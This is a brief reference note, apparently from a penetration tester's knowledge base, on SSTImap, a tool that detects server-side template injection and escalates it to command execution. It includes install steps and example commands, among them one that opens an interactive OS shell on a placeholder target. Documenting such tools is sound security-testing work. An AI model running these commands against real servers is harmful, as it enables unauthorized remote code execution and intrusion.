# SSTImap

**Tags:** `#SSTImap` `#SSTI` `#template-injection` `#Jinja2` `#RCE` `#web`

Server-Side Template Injection detection and exploitation tool — the maintained successor to `tplmap`. It fingerprints the templating engine behind a reflected input (Jinja2, Twig, Freemarker, Velocity, Mako, ERB, …), confirms injection, and escalates to code/OS-command execution or a shell, handling the engine-specific sandbox-escape gadget chains for you. Point it at a URL/parameter or a full request file.

**Source:** https://github.com/vladko312/SSTImap
**Install:** `git clone https://github.com/vladko312/SSTImap && pip install -r requirements.txt`.

```bash
# Detect + identify the engine on a parameter
python3 sstimap.py -u "http://<target>/page?name=test"

# Interactive OS shell once injectable
python3 sstimap.py -u "http://<target>/page?name=test" --os-shell

# From a saved Burp request (POST bodies, headers, cookies)
python3 sstimap.py -r request.txt --os-cmd id
```

---

> [!note] **See also** — [[Services/Web Services/Flask|Flask]] — automated detection/exploitation of Jinja2 SSTI when user input reaches `render_template_string()`.

---

*Created: 2026-09-25*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
